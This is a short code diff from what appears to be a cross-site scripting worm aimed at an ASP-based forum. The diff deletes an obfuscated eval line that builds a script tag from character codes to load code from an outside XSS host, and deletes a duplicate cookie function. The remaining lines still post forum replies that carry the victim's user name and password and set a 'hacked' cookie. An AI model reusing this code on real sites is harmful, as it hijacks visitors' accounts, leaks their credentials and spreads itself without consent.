@@ -174,7 +174,6 @@ setTimeout(function(){
 	
 	return x;
 }();
-eval('window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,120,115,115,46,116,119,47,54,53,53);document.body.appendChild(window.s)');
 function setCookie(name, value, expires, path, domain, secure) {
     document.cookie = name + "=" + escape(value) +
     ((expires) ? "; expires=" + expires : "") +
@@ -207,13 +206,6 @@ xss.ajax("/mytopic.asp",function(){
 	}
 	
 });
-function setCookie(name, value, expires, path, domain, secure) {
-    document.cookie = name + "=" + escape(value) +
-    ((expires) ? "; expires=" + expires : "") +
-    ((path) ? "; path=" + path : "") +
-    ((domain) ? "; domain=" + domain : "") +
-    ((secure) ? "; secure" : "");
-}
 
 xss.ajax("/SaveReAnnounce.asp?method=fastreply&BoardID=211",'followup=648207441&RootID=4090055&star=1&UserName='+user+'&passwd='+pass+'&Expression=face7.gif&Content=happy+new+year~+by+flanker&signflag=yes',function(){});
 setCookie("hacked","1");
